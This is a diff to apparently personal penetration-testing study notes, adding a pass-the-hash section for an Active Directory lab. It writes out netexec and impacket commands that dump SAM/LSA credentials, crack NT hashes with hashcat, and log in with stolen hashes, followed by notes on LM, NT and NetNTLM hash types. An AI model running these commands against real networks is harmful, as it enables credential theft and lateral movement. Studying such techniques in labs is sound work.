@@ -126,7 +126,27 @@ net use M: /delete
 
 
 Attacking AD post compromise attacks
-Pass the Hash
+Pass the Hash (PTH)
+Uses NTLM, because NTLM has MANY problems
+Dump credentials from machine:
+#Old tool is cracmapexec, new tool is netexec
+#alias nxc
+netexec smb 192.168.1.0/24 -d marvel.local -u fcastle -p Password1 --sam --lsa
+impacket-psexec marvel.local/fcastle:Password1@192.168.1.100 # Likely fail due to AV
+awk '{print $5,$6}' hashes_sam_dump.txt > fixes_hashes_sam_dump.txt #Use this to filter the hasehs for cracking, awk is better than cut due to spacing inconsistency
+#Like always verify correct hash saving
+hashcat -m 1000 -a 0 fixes_hashes_sam_dump.txt $ROCKYOU
+# Guest account will have blank password, WDAGutilityAccount has no password
+#Use this to identify reused local admin creds and PtH
+nxc smb 192.168.1.0/24 -u "Peter Parker" -H 58a478135a93ac3bf058a5ea0e8fdb71 --local-auth # Requirtes only new NT hash
+# Using "Frank Castle" didn't work, but because the user password had expired and needed to be updated
+impacket-psexec "Frank Castle":@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a2 # Requires LM+NT hash
+Note:
+# LM hash (VERY outdated and bad)
+# NT hash (Hashes of local accounts. In SAM. Can be used in PtH. Can also be cracked.) #TODO, does it also store network account hashes? 
+# SAM stored hash has LM:NT stored as both hashes. The LM hash is generic and same
+# NetNTLMv1 and NetNTLMv2 hash (Hash used during NTLM auth over network, can't be used for PtH, can still be cracked. Can be relayed). 
+# NetNTLMv1 hashes are older and easier to crack. Both use  HMAC-MD5 to hash
 
 Kerberos fix Kali
 sudo timedatectl set-ntp off
